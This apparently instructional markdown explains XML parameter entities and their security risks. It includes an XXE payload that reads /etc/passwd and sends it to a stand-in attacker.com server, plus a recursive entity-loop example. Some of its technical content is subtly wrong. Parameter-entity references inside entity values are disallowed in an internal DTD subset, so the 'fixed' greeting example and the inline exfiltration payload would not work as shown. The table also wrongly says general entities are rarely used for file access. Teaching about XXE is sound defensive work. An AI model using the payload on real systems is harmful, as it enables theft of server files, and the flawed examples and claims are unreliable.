# XXE Indepth


Parameter entities in XML are used within DTDs (Document Type Definitions) and are different from general entities, which are used in the XML content itself. Parameter entities are primarily used for defining reusable content or DTD fragments and help in structuring DTDs in a modular way.


## What Are Parameter Entities?

Parameter entities are declared with a % character, followed by the entity name, and are used in DTDs (not in the XML document body).
They are typically employed to include reusable DTD fragments or configuration within the DTD.
To reference a parameter entity, you need to use %entityName; inside the DTD.

### Syntax for Declaring Parameter Entities


<!ENTITY % entityName "replacement text or value">

%entityName; will be replaced with "replacement text or value" wherever it is referenced in the DTD.

#### Examples of Parameter Entities

#### 1. Basic Parameter Entity Usage

<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ELEMENT root (#PCDATA)>
]>
<root>%greeting;</root>

In this example:
The DTD defines a parameter entity named greeting with the value "Hello, World!".
However, this example is incorrect in practice because %greeting; cannot be used directly in the XML document content.

To use the parameter entity, you need to declare an additional general entity:

<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ENTITY myGreeting "%greeting;">
   <!ELEMENT root (#PCDATA)>
]>
<root>&myGreeting;</root>

Here, myGreeting is a general entity that uses the value of the parameter entity %greeting.

#### 2. Including an External DTD Using Parameter Entities
You can use parameter entities to include external DTDs, making the DTD modular and easier to maintain.


#### External DTD (common.dtd):

<!ENTITY % commonElements "<!ELEMENT greeting (#PCDATA)>">

#### Main XML File:

<!DOCTYPE root [
   <!ENTITY % common SYSTEM "http://example.com/common.dtd">
   %common;
   %commonElements;
]>
<root>
   <greeting>Hello from an external DTD!</greeting>
</root>

In this example:
The parameter entity %common references an external DTD file located at http://example.com/common.dtd.
%commonElements; is used to insert the content from the external DTD (in this case, an element declaration).


#### 3. Conditional DTD Sections Using Parameter Entities
Parameter entities can be used to include or exclude parts of a DTD based on conditional sections.

<!DOCTYPE root [
   <!ENTITY % includeGreeting "INCLUDE">
   <![%includeGreeting;[
      <!ELEMENT greeting (#PCDATA)>
   ]]>
   <!ELEMENT root (greeting)>
]>
<root>
   <greeting>Conditional Greeting Example</greeting>
</root>

In this example:
The %includeGreeting parameter entity determines whether the greeting element is included.
The conditional section <![%includeGreeting;[ ... ]]> is included because %includeGreeting is set to "INCLUDE".

##Security Implications of Parameter Entities

1. #### XML External Entity (XXE) Attacks 

Parameter entities can be used to reference external files or resources, leading to XXE vulnerabilities if the XML parser is not configured securely

<!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
]>
<root>&exfil;</root>
In this XXE example, an external file (/etc/passwd) is accessed and sent to an attacker's server.

2. #### Entity Reference Loops
   Defining parameter entities that reference each other in a circular manner can cause infinite loops:

<!ENTITY % loop "%loop;">
This will trigger a "detected an entity reference loop" error in most XML parsers.

## Differences Between Parameter Entities and General Entities

|        Feature               |            Parameter Entities                            |    General Entities
|------------------------------|:---------------------------------------------------------|--------------------------------------------------------------:
|  Declared with               |         % (e.g., <!ENTITY % name "value">)               |           None (e.g., <!ENTITY name "value">)
|  Usage Scope                 |                Within DTDs only                          |             In XML document content
|  Syntax for Reference        |                %name;                                    |         &name;
|  Typical Use Cases           |         Including DTD fragments,conditional DTD sections |             Embedding content in XML 
|  Security Considerations     |         Can lead to XXE or loops if misconfigured        |                Rarely used for file access


Summary
Parameter entities are a powerful feature in XML DTDs that help in reusing and modularizing DTD content. However, they must be used with caution due to the security risks associated with external entities and potential loops. Proper configuration of XML parsers and secure handling of DTDs is crucial to avoid XXE vulnerabilities.
